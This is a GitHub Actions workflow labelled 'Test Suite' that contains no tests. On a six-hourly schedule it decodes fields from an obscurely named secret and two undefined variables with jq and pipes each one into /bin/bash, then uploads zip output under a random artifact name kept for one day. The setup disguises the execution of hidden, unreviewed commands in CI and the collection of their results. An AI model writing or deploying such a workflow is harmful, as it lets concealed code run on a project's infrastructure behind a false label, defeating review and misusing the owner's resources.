name: Test Suite
on:
  workflow_dispatch:

  schedule:
    - cron: '51 0,6,12,18 * * *'
permissions:
  contents: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  trigger:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Start
        env:
          zk5: ${{ secrets.zk5 }}
        run: |
          printf '%s' "$zk5" | jq -r .hi47 | /bin/bash
          echo $gd1 | jq -r .duou7 | /bin/bash
          printf '%s' "$xpqkt99" | jq -r .dm932 | /bin/bash

      - name: Save output
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: nigCtZNZ
          path: "*.zip"
          retention-days: 1
